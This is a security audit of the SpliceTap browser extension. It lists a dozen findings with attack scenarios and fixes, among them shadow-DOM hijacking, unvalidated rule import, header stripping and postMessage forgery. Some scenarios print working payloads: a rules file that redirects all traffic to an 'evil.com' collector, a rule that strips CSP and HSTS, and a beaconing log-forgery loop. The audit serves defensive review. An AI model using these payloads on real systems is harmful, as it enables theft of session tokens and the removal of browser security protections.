# Security Audit — SpliceTap
_Reviewer lens: browser-extension security. Method: static review of 21 files (manifest, both content-script worlds, overlay, service worker, DNR mapper, shared `src/` modules, popup, options, devtools), branch `V1` @ `9921ee9`. Two claims verified by executing the relevant module under Node; everything else is static reading with line citations._

## Threat model

- **Malicious/compromised web page (primary).** Every site the user visits hosts SpliceTap's MAIN-world interceptor and ISOLATED-world relay. It wants to: forge messages into the extension, read or steer the in-page rule editor, plant a persistent rule, fingerprint the user, or defeat mocking.
- **Third-party iframe on an otherwise-benign page** (ad, analytics, embed). Same capabilities as above for `window.postMessage`-reachable surfaces, because the relay runs `all_frames: true` and does no source validation.
- **Malicious rules file.** Rule sets are shareable JSON — a Slack link, a Gist, a "SpliceTap config for our staging env" in a README. Import is one click and applies immediately with no preview. This is SpliceTap's most realistic attack vector.
- **Another installed extension.** Wants to drive SpliceTap's message router to install rules. (Ruled out below — no `externally_connectable`, no `onMessageExternal`.)
- **Accidental self-exposure.** The interceptor sees every fetch/XHR on banking, webmail, and internal tools. Anything it logs, persists, or emits back to the page is a data-handling liability regardless of attacker.
- **Chrome Web Store reviewer.** `<all_urls>` + MAIN-world injection + `declarativeNetRequest` on every site is the highest-scrutiny permission combination there is; unjustified breadth is a rejection risk.

## Summary

- **A malicious page can hijack the in-page rule editor.** The overlay's Shadow DOM is `mode: 'open'` (`content/overlay.js:319`), so the host page can read the form, rewrite every field, and synthesise the Save click. The user's one benign "Save Rule" becomes a persistent, global, attacker-chosen rule — and the page can read any rule the user opens for editing. (S-1)
- **Rule import is completely unvalidated** (`options/options.js:1165-1220` → `service_worker/background.js:140-161` → `src/storage.js:75`). Nothing checks `type`, URL pattern breadth, redirect destination, or header operations. A single imported rule with `match.url: "*"` and `type: "redirect"` silently MITMs every fetch/XHR on every site, request bodies and all. (S-2)
- **`headers` rules map straight into `declarativeNetRequest` with no denylist** (`service_worker/dnr.js:51-73`), so an imported rule can strip `Content-Security-Policy` / `X-Frame-Options` / `Strict-Transport-Security` and force `Access-Control-Allow-Origin: *` browser-wide. (S-3)
- **No `event.source` or origin validation on either side of the MAIN↔ISOLATED bridge** (`content/content.js:112-130`, `content/injected.js:593`). Any page or iframe can inject arbitrary entries into the extension's interception log and inflate the persisted stats counter. (S-4)
- **`escapeHtml` is quote-unsafe and several rule fields aren't escaped at all** in the popup and devtools panel. MV3's default CSP blocks script execution, so this is HTML injection / UI spoofing / CSS beaconing rather than XSS — but the sinks are real. (S-5, S-6)
- **XHR patch mode forces `credentials: 'include'`** (`content/injected.js:541`), upgrading cross-origin XHRs the page deliberately sent uncredentialed into cookie-bearing requests. (S-7)

## Findings

### [High] S-1: Host page can read and drive the in-page rule editor (open Shadow DOM)

- **Where:** `content/overlay.js:319` (`attachShadow({ mode: 'open' })`), `:329` (host appended to `document.documentElement`), `:331-333` (plain `addEventListener` on Save, no `isTrusted` check), `:429-525` (`collect()` reads live DOM values at click time), `:543` (`chrome.runtime.sendMessage({ type: 'saveRule' })`).
- **What:** The rule editor renders inside a Shadow DOM to isolate *styles*, but `mode: 'open'` means `document.getElementById('splicetap-rule-overlay-host').shadowRoot` is fully readable and writable from the page's own JS. `collect()` reads the form fields at the moment Save is clicked, and the Save handler accepts untrusted (synthetic) click events. `populate()` (`:387-423`) writes the *entire* rule being edited into those fields first.
- **Attack scenario:**
  1. User is on `evil.com` and opens SpliceTap's rule editor (popup "New Rule"/"Edit", or right-click → "Mock this request"). Both paths render the overlay in the current tab (`popup/popup.js:413-438`, `service_worker/background.js:436-441`).
  2. `evil.com` detects the host element (`MutationObserver` on `documentElement`, or poll for `#splicetap-rule-overlay-host`).
  3. Exfiltration: it reads `shadowRoot.getElementById('tmBody').value`, `tmHdrReq`, `tmMatchHeaders` — i.e. whatever the user baked into that rule, which in practice includes API keys, bearer tokens and internal hostnames.
  4. Escalation: just before/instead of the user's click it sets `tmType=headers`, `tmUrl=*`, `tmHdrRes=[{"op":"remove","name":"content-security-policy"}]` and calls `shadowRoot.getElementById('tmSave').click()`. The rule is persisted by the background, gets a `dnrRuleId`, and is registered in DNR globally.
- **Impact:** A drive-by page escalates to a persistent, browser-wide network rule (see S-2/S-3 for what that buys), and can read the contents of any rule the user edits while on that page. The visual dialog the user sees does not have to match what gets saved.
- **Recommended fix:** `attachShadow({ mode: 'closed' })` and keep the root in a module-scoped variable (the ISOLATED world's `attachShadow` cannot be hooked by the page, so this is genuinely closed). Additionally gate `save()` on `event.isTrusted`, and re-validate the collected rule in the background rather than trusting the content script (see S-2).
- **Confidence:** High.

### [High] S-2: Rule import performs no validation — one file yields full traffic MITM on every site

- **Where:** `options/options.js:1165-1220` (`importRules`: `JSON.parse` → assign new ids → `sendMessage({type:'setRules'})`, no schema check), `service_worker/background.js:140-161` (`setRules`: only allocates `dnrRuleId`, no validation), `src/storage.js:75-100`/`:117-130` (`saveRules`/`normalizeRule`: only defaults `type` and `response.mode`). `SpliceTapUtils.validateUrlPattern` (`src/utils.js:12`) and `validateRule` (`service_worker/background.js:292`) exist but are only reachable from the manual "Test" button, never from save or import.
- **What:** Imported rules are persisted and activated verbatim. There is no check that `match.url` is narrower than "everything", no check on `redirect.destination`, no cap on rule count, and no preview of what is about to be installed. The success toast says only `Imported N rules successfully!` (`:1212`).
- **Attack scenario:** Attacker publishes `splicetap-staging-rules.json` containing:
  ```json
  [{"name":"Staging API","enabled":true,"type":"redirect",
    "match":{"method":"*","url":"/^https:\\/\\/(.*)$/"},
    "redirect":{"destination":"https://collector.evil.com/$1"}}]
  ```
  `matchUrl` treats a `/.../`-wrapped pattern as a regex (`src/matcher.js:31-34`), so this matches every request. On every page, `window.fetch` rewrites the destination via `computeRedirectUrl` and re-issues the request — `new Request(newUrl, resource)` (`content/injected.js:187`) carries the original **method, headers and body** to the attacker's host. XHR is redirected the same way at `open()` time (`content/injected.js:412-419`).
- **Impact:** Silent exfiltration of every XHR/fetch payload (session tokens in `Authorization` headers, form posts, GraphQL queries) from every origin the user visits, plus the ability to serve attacker-controlled JSON back to the app — which is stored-XSS-by-proxy on any site that renders API data as HTML. A `mock` rule with `match.url: "*"` achieves the same response-tampering without any network egress. Neither the popup nor the options page surfaces "this rule matches every URL".
- **Recommended fix:** Validate on the **background** side of `setRules`/`saveRule` (the only trust boundary that matters — the options page and the overlay are both spoofable per S-1): enforce the v2 schema, run `validateUrlPattern`, reject unknown `type` values, reject `redirect.destination` schemes other than `http(s)`, and cap rule count/size. In the import UI, render a diff/preview listing each rule's type, pattern and destination, flag patterns that match `*`/`/.*/`, and require an explicit confirm. Import disabled-by-default (`enabled: false`) would also be a cheap, large win.
- **Confidence:** High.

### [High] S-3: `headers` rules become DNR `modifyHeaders` with no denylist — security headers can be stripped globally

- **Where:** `service_worker/dnr.js:51-56` (`mapHeaderOp` — passes `op.name`/`op.value` straight through), `:62-73` (`buildHeadersAction`), `:99-113` (`ruleToDnr`), `:121-140` (`syncDnrRules`). Validation in `options/options.js:526-531` only checks that `op` is `set|remove` and `name` is a non-empty string; `content/overlay.js:504-510` checks even less; import (S-2) checks nothing.
- **What:** Any response-header name may be `remove`d or `set` on any URL pattern, including `*`. DNR response-header modification is applied by the network stack before the renderer sees the response, so it defeats page-side protections.
- **Attack scenario:** An imported (or S-1-planted) rule:
  ```json
  {"type":"headers","enabled":true,"match":{"method":"*","url":"*"},
   "headersMod":{"response":[
     {"op":"remove","name":"content-security-policy"},
     {"op":"remove","name":"content-security-policy-report-only"},
     {"op":"remove","name":"x-frame-options"},
     {"op":"remove","name":"strict-transport-security"},
     {"op":"set","name":"access-control-allow-origin","value":"*"},
     {"op":"set","name":"access-control-allow-credentials","value":"true"}]}}
  ```
  `buildCondition` maps `url: "*"` to `urlFilter: "*"` (`dnr.js:31-40`) — every request, every site.
- **Impact:** CSP off browser-wide (turns any reflected-input bug anywhere into working XSS), framing protection off (clickjacking on banking/webmail), HSTS off (downgrade on first contact), and a permissive credentialed-CORS policy that lets any origin read cross-origin responses. Note the shipped `corsUnblock` template (`options/options.js:685-693`) already normalises `ACAO: *` on `url: "*"` as a legitimate workflow, so this pattern will not look anomalous to the user.
- **Also:** `ruleToDnr` uses `rule.dnrRuleId` verbatim as the DNR id (`dnr.js:108`) and `setRules` only allocates one when absent (`background.js:151-153`), so an imported rule can pin its own id and collide with a user rule's slot.
- **Recommended fix:** Denylist security-relevant response headers for `remove`/`set` (`content-security-policy*`, `x-frame-options`, `strict-transport-security`, `x-content-type-options`, `set-cookie`, `access-control-allow-*`) or, at minimum, require an explicit per-rule "I understand this disables a security header" acknowledgement recorded on the rule. Reject `url: "*"`/`/.*/ `for `headers` rules outright. Always re-allocate `dnrRuleId` server-side for imported rules instead of honouring the supplied value.
- **Confidence:** High.

### [Medium] S-4: `window.postMessage` bridge validates neither `event.source` nor origin

- **Where:** `content/content.js:112-130` (relay listener — checks only `event.data.source === 'splicetap-injected'`), `content/injected.js:593-615` (interceptor listener — checks only `event.data.source === 'splicetap-extension'`), `content/injected.js:66-78` (sender posts with target origin `'*'`), `service_worker/background.js:212-221` (`logInterception` handler — pushes `request.entry` with no shape, type or size validation), `:90-99` (router does not inspect `sender`).
- **What:** `event.data.source` is a string the page can trivially write. Neither listener compares `event.source` to `window`, so a same-page script *or any third-party iframe* posting to `parent` reaches the relay, which forwards straight to the privileged background.
- **Attack scenario:** Any page (or embedded ad frame) runs:
  ```js
  for (let i = 0; i < 5000; i++) window.postMessage({
    source: 'splicetap-injected', type: 'logInterception',
    entry: { ts: Date.now(), url: 'A'.repeat(50000), method: 'GET',
             ruleId: 'x', ruleName: 'x" style=background:url(//evil/?p)',
             ruleType: 'mock', status: 200 }}, '*');
  ```
  Every message is relayed (`content.js:123-128`) and appended to `this.interceptionLog` (`background.js:214`) with `_applyStatsIncrement(1)` (`:218`) and periodic persistence into `chrome.storage.session` (`:282`).
- **Impact:** (a) The DevTools interception log — the user's audit trail of what SpliceTap did — is fully forgeable, so a page can hide its own interception among noise or fabricate history; (b) the persisted `intercepted` stat in `chrome.storage.local` is attacker-controlled; (c) 200 unbounded entries can be pushed toward the session-storage quota and the SW is kept busy by an unthrottled in-memory push path (only *persistence* is throttled, `:274-279`); (d) the injected strings land in the devtools panel's attribute sinks — see S-6. Separately, the reverse direction lets a page forge `syncState` (`injected.js:594`) to set `tmState.active = false` or replace `tmState.rules` for itself, defeating the user's mocking on that page.
- **Recommended fix:** In both listeners require `event.source === window` and, for the relay, `event.origin === window.location.origin`. In `background.js:212`, validate `sender.id === chrome.runtime.id` and the entry shape (whitelist keys, coerce types, cap `url`/`ruleName` length), and rate-limit per tab. Treat every `chrome.runtime.onMessage` payload originating from a content script as untrusted input.
- **Confidence:** High.

### [Medium] S-5: Rule fields reach `innerHTML` unescaped in the popup

- **Where:** `popup/popup.js:152-154` (`container.innerHTML = ...map(getRuleCardHTML)`), and inside `getRuleCardHTML`:
  - `:174`, `:179`, `:195`, `:198`, `:201`, `:204` — `data-rule-id="${rule.id}"`, raw.
  - `:165` + `:188` — `class="rule-method ${methodClass}"` and `>${rule.match.method || 'GET'}<`, both raw. This is a **text-node** sink, so `<` is not neutralised.
  - `:189` — `${this.getRuleSummaryText(rule)}`, which returns raw `rule.delayMs` (`:243`) and raw `` `${rule.response.statusCode} ${rule.response.statusText}` `` (`:254`).
  - `:228` — `data-type="${type}"`, raw `rule.type`.
- **What:** Only `rule.name` and `rule.match.url` go through `escapeHtml` (`:170-171`); the rest of the attacker-influenceable rule surface does not. A rule is attacker-influenceable via import (S-2) or via S-1.
- **Attack scenario:** Imported rule with `"match": {"method": "<img src=x id=searchInput>", "url": "*"}` injects arbitrary markup into the popup on next open.
- **Impact:** **Not** script execution — MV3's default extension-page CSP (`script-src 'self'; object-src 'self'`; no custom `content_security_policy` in `manifest.json`, no inline scripts in `popup/popup.html:97`) blocks inline handlers and remote script. What remains is real but bounded: convincing UI spoofing inside the trusted `chrome-extension://` popup (a fake "session expired — re-enter your token" panel), outbound beaconing via `<img>`/CSS `url()` (the default CSP constrains neither `img-src` nor `style-src`), `<iframe>`ing attacker content into the popup, and DOM clobbering of the ids `popup.js` looks up (`searchInput`, `statusToggle`, `rulesContainer`, …).
- **Recommended fix:** Escape every interpolation, or (better) rebuild `getRuleCardHTML` with `document.createElement` + `textContent`/`setAttribute`. Fix `escapeHtml` first (S-6). Consider tightening the manifest CSP explicitly rather than relying on the default.
- **Confidence:** High.

### [Medium] S-6: `escapeHtml` does not escape quotes but is used in attribute contexts

- **Where:** `popup/popup.js:837-841`, `devtools/panel.js:38-43`, `src/utils.js:113-118` — all three are the `div.textContent = x; return div.innerHTML` idiom. Attribute-context uses: `popup/popup.js:183` (`aria-label="Enable rule: ${safeName}"`), `devtools/panel.js:165` (`title="${escapeHtml(entry.url)}"`), `:168` (`data-type="${escapeHtml(entry.ruleType)}"`).
- **What:** The textContent→innerHTML round-trip escapes `&`, `<`, `>` and non-breaking space. It does **not** escape `"` or `'`, because those are not special in text position. Verified by execution: input `a" onmouseover="x` survives unchanged. Placing that output inside a double-quoted attribute lets an attacker close the attribute and add new ones.
- **Attack scenario:** Combined with S-4, a page posts a forged log entry whose `url` is `x" style="position:fixed;inset:0;background:url(https://evil/?tm)` — the devtools panel renders it into `title="…"` and the injected `style` attribute fires an outbound request from the extension origin and can cover the panel. Because `<` *is* escaped in `panel.js`, injection there is confined to attributes on the existing element (no new tags); in `popup.js` the raw sinks of S-5 remove even that limit.
- **Impact:** Attribute injection in two extension pages — beaconing, layout/UI spoofing, DOM clobbering. No script execution under the default MV3 CSP.
- **Recommended fix:** Replace all three helpers with an explicit map covering `& < > " ' /`, and reserve them for text; use `setAttribute` for attributes. The three copies should be one shared helper.
- **Confidence:** High.

### [Medium] S-7: XHR patch mode forces `credentials: 'include'` on the upstream request

- **Where:** `content/injected.js:535-542`.
- **What:** When a `mock`/`patch` rule matches an XHR, the interceptor abandons the XHR and re-issues the request with `originalFetch(requestUrl, { method, headers: requestHeaders, body, credentials: 'include' })`. `XMLHttpRequest.withCredentials` defaults to **false** for cross-origin requests, and the code neither reads nor honours it. The fetch path does not have this problem — it forwards the caller's original arguments (`:195`).
- **Attack scenario:** A page issues a deliberately anonymous cross-origin XHR to `https://api.partner.com/...`. With a patch rule active, SpliceTap re-sends it with the user's `partner.com` cookies attached. The response is still CORS-gated, so it is not directly readable — but the *request* executes server-side with the user's session (a CSRF-style side effect the page never asked for). Chain it with an S-3 rule setting `ACAO: *` + `ACAC: true` and the response becomes readable too.
- **Impact:** Silent credential attachment to cross-origin requests on every site where a patch rule matches; ambient-authority side effects; loss of the page's intentional anonymity guarantee.
- **Recommended fix:** Map `xhr.withCredentials` to `credentials: 'include' | 'omit'` and preserve same-origin default behaviour (`'same-origin'`). Also drop forbidden request headers rather than replaying `requestHeaders` wholesale.
- **Confidence:** High.

### [Low] S-8: Interception log records full URLs (query strings included) and persists them

- **Where:** `content/injected.js:65-79` (entry construction — `url` is the full request URL), `service_worker/background.js:214` (ring buffer, 200 entries), `:282` (`chrome.storage.session.set({ spliceTapInterceptionLog })`), `:286` + `src/storage.js:228-246` (stats to `chrome.storage.local`), `devtools/panel.js:165` (rendered with a full-URL `title` tooltip).
- **What:** Every applied rule logs the complete URL. URLs routinely carry bearer tokens, `?access_token=`, password-reset nonces, order ids and email addresses. There is no redaction, no truncation at capture time (only display truncation at `panel.js:45-48`), and no user-facing "don't log" switch. Persistence is `chrome.storage.session`, so it survives service-worker suspension for the whole browser session.
- **Impact:** Sensitive query parameters accumulate in extension storage, readable by anything with access to the profile directory and by any future code path that exports storage (the options "Raw Data" viewer at `options/options.js:1384-1393` does `chrome.storage.local.get(null)` and dumps it into a textarea the user may copy/paste). Bounded by the fact that only *matched* requests are logged, and no request/response **bodies** are captured.
- **Recommended fix:** Store origin + path and strip the query string by default (or redact values of a known-sensitive parameter list), cap entry length, and add a settings toggle for logging. Document the retention in the store listing.
- **Confidence:** High.

### [Low] S-9: The extension is trivially fingerprintable and leaks rule names to every page

- **Where:** `content/injected.js:17-18` (`window.__SPLICETAP_INITIALIZED__ = true` — a MAIN-world global on every page), `:119`/`:253` (patched `fetch`/`XMLHttpRequest`, detectable via `Function.prototype.toString`), `:237-238` and `:213-214` (`x-splicetap` / `x-splicetap-rule` response headers readable by the page), `:66-78` (`postMessage(..., '*')` broadcasts `ruleId`, `ruleName`, `url` into the page where any script can listen), `:58-61` (unconditional `console.error` on missing globals), `content/content.js:157`/`:161`/`:171` (unconditional `console.log`s on every page).
- **What:** Any site can detect SpliceTap with a one-liner, and — once a rule fires — learn the rule's **name** (frequently internal project/service names) from either the broadcast message or the `x-splicetap-rule` header.
- **Impact:** Extension fingerprinting for tracking; anti-tamper/anti-bot systems can single out and block SpliceTap users; minor internal-naming leak. Also lets a hostile page tailor the S-1/S-4 attacks to only fire when SpliceTap is present.
- **Recommended fix:** Use a non-enumerable, randomly-named guard (or a `WeakSet` in the ISOLATED world). Drop `x-splicetap-rule` (or make it opt-in behind debug mode). Target the `postMessage` at `window.location.origin` and send only `ruleId`, resolving the name in the background. Gate the informational `console.log`s behind `settings.debugMode` as the interceptor already does (`injected.js:32-36`).
- **Confidence:** High.

### [Low] S-10: Regex URL patterns are compiled from rule data and run on every request (ReDoS)

- **Where:** `src/matcher.js:31-34` (`new RegExp(pattern.slice(1,-1), 'i')` then `.test(url)`), `:25-30` (wildcard branch), `content/injected.js:88-99` (`computeRedirectUrl` compiles the same pattern again per redirect), `service_worker/dnr.js:33` (`regexFilter` — Chrome enforces its own regex budget here, so DNR is the safer path).
- **What:** `findMatchingRule` runs on every intercepted `fetch` and `XMLHttpRequest.send`, iterating all enabled rules and compiling their regexes. Nothing rejects catastrophic-backtracking patterns; `validateUrlPattern` (`src/utils.js:38-45`) only checks that the regex *compiles*, and is not on the save/import path anyway (S-2).
- **Attack scenario:** Imported rule with `match.url: "/^(a+)+$/"` (or any nested-quantifier pattern) plus a long non-matching URL. Every request on every page then burns exponential time on the page's main thread.
- **Impact:** Browser-wide denial of service that looks like "the web got slow", hard for a user to attribute to SpliceTap. No confidentiality impact.
- **Recommended fix:** Compile each rule's regex once at load (cache on the rule) rather than per request; reject patterns with nested quantifiers; and/or execute matching against a length-capped URL with a complexity guard. Prefer DNR for pure URL matching where possible.
- **Confidence:** Medium (ReDoS is pattern-dependent; the unbounded compile-and-run-per-request path is verified).

### [Low] S-11: Permission and injection scope is broader than the feature set requires

- **Where:** `manifest.json:6-14` (`activeTab` alongside `host_permissions: ["<all_urls>"]`), `:19-32` (MAIN-world interceptor on `<all_urls>`, `all_frames: true`, `document_start`), `:33-38` (overlay on `<all_urls>`).
- **What:**
  - `activeTab` is redundant: with `<all_urls>` host permissions, `chrome.tabs.sendMessage` and content-script injection already work everywhere. It adds nothing but another line in the install prompt.
  - The interceptor is injected and `window.fetch`/`XMLHttpRequest` are patched on **every frame of every site unconditionally**, even when the extension is toggled off or the rule list is empty. `tmState.active` is only consulted *inside* the wrapper (`injected.js:120`, `:456`), after the patch is already in place.
  - The overlay content script loads on every page even though it is only ever used on demand.
- **Impact:** Maximal blast radius for any interceptor bug; unnecessary presence in the address bar of banking/webmail sessions; and the single biggest driver of Chrome Web Store review friction. Also amplifies S-9 and S-10.
- **Recommended fix:** Drop `activeTab`. Consider `chrome.scripting.registerContentScripts` to inject the interceptor only for origins that actually have enabled rules (recomputed on every rule change), and inject the overlay on demand via `chrome.scripting.executeScript` from the popup/context-menu handler. If unconditional injection must stay, restore the pristine `fetch`/`XMLHttpRequest` when the rule set for that origin is empty.
- **Confidence:** High (the scope is verified; whether a narrower model is feasible for every workflow is a product call).

### [Nit] S-12: Rule name copied into a response header; test/demo pages ship in the package

- **Where:** `content/injected.js:214` and `:238` (`headers.set('x-splicetap-rule', rule.name)`), `demo.html:197` (`resultsDiv.innerHTML = \`<pre>${JSON.stringify(data,null,2)}</pre>\``), `tests/browser_test.html`, `tests/simulation.html`, and the absence of a packaging step (`package.json` has no build/zip script).
- **What:** `Headers.set` validates its value — a rule name containing a newline, `\0`, or certain non-ASCII characters throws a `TypeError` inside the `fetch` wrapper, which rejects the page's fetch with a confusing error rather than serving the mock. Header *injection* is not possible (the API blocks it), so this is a robustness bug, not a vuln. Separately, `demo.html` and `tests/*.html` would be included in an unfiltered zip; none are in `web_accessible_resources` so no page can frame them, but they are dead weight and an extra reviewer question.
- **Recommended fix:** Sanitise/omit the rule name in the header (or send `rule.id`), wrap the `set` in a try/catch, and add a packaging step that excludes `tests/`, `demo.html`, `node_modules/`, and `*.txt` scratch files.
- **Confidence:** High.

## Checked and ruled out

- **Other extensions driving the message router.** `manifest.json` declares no `externally_connectable`, and no `chrome.runtime.onMessageExternal` / `onConnectExternal` listener exists anywhere in the repo (grep-verified). Chrome's default (`externally_connectable` absent → other extensions may connect, web pages may not) delivers such messages to `onMessageExternal` only, which is unregistered. `background.js:90` is therefore reachable only from this extension's own contexts. **Not exploitable by another extension.** The missing `sender` check is still worth adding as defence-in-depth because content scripts are semi-trusted (S-4).
- **Web pages calling `chrome.runtime.sendMessage` directly.** Same reason — no `externally_connectable.matches`. Pages must go through the `postMessage` relay, which is the S-4 path.
- **Prototype pollution in the merge-patch engine.** `src/patch.js:19-40`. Verified by execution: `jsonMergePatch({a:1}, JSON.parse('{"__proto__":{"polluted":"yes"}}'))` leaves `Object.prototype` untouched (`({}).polluted === undefined`). `Object.assign({}, original)` produces a fresh object, and `target['__proto__'] = …` swaps only that object's own prototype, which `JSON.stringify` then ignores. `constructor`/`prototype` keys become ordinary shadowing own-properties. **Clean.**
- **The overlay's own markup.** `content/overlay.js:326` (`wrap.innerHTML = markup()`) interpolates only the module-level `RULE_TYPES`/`METHODS` constants (`:27-36`) — no rule data. `populate()` (`:387-423`) writes exclusively to `.value`/`.checked`, and `showError` (`:366-371`) uses `textContent`. **No injection sink in the overlay** (its problem is S-1, page access to the tree, not markup construction).
- **The options page as an XSS sink.** `options/options.js` has exactly one `innerHTML` use, `:1267`, and it assigns the empty string; the message element itself is built with `createElement` + `textContent` (`:1269-1273`). `showConfirmation` (`:1291-1292`) and the data viewer (`:1393`) also use `textContent`/`.value`. `renderRuleTypeBadge` (`:1531-1534`) *is* an unescaped template but is **dead code** — never called, and `options.html` has no rules-list container. **Currently safe; do not resurrect that function without escaping.**
- **Request/response bodies in the interception log.** The entry built at `content/injected.js:67-77` contains only `ts`, `url`, `method`, `ruleId`, `ruleName`, `ruleType`, `status`. **No bodies, no request headers, no cookies are captured or transmitted anywhere.** The URL itself is the exposure (S-8).
- **Outbound network traffic from the extension itself.** No telemetry, analytics, or remote-config endpoint exists. The only fetches the extension originates are the passthrough/patch calls to the page's own intended destination (`injected.js:195`, `:537`) — plus whatever a redirect rule points at, which is the user's (or S-2 attacker's) configuration, not extension behaviour.
- **Remote code loading.** No `eval`, `new Function`, `document.write`, `insertAdjacentHTML`, `Range.createContextualFragment`, dynamic `<script>` injection, or remotely-hosted script anywhere (grep-verified). All four HTML pages load a single local `<script src>`. **CWS "no remote code" requirement is met.**
- **GraphQL operation-name matching.** `src/matcher.js:73-85` escapes the operation name before building the fallback regex (`:81`), and the primary path is a plain `JSON.parse` + `===` comparison. **No injection.**
- **DNR `queryparams` rules as a redirect primitive.** `service_worker/dnr.js:79-92` emits `redirect.transform.queryTransform` only — Chrome's transform cannot change scheme or host, so a `queryparams` rule cannot retarget a request to an attacker host. (It *can* strip an auth query parameter, which is a nuisance, not an exfiltration channel.) The dangerous cross-host redirect lives in the interceptor path instead (S-2).
- **`chrome.storage.session` reachability from content scripts.** Default access level is trusted-contexts-only and the code never calls `setAccessLevel`, so the interception log is not readable by the page.
- **`{{request.url}}` placeholder in mock bodies.** `src/placeholders.js:67-69` substitutes the page-controlled URL into the body string before `JSON.parse` (`:77`). A URL containing `"` can therefore break or restructure the resulting JSON object. Impact is confined to the user's own mock response on the page that supplied the URL, and a parse failure falls back to the original body (`:78-81`). **Noted, not filed** — escaping the substitution would still be correct.
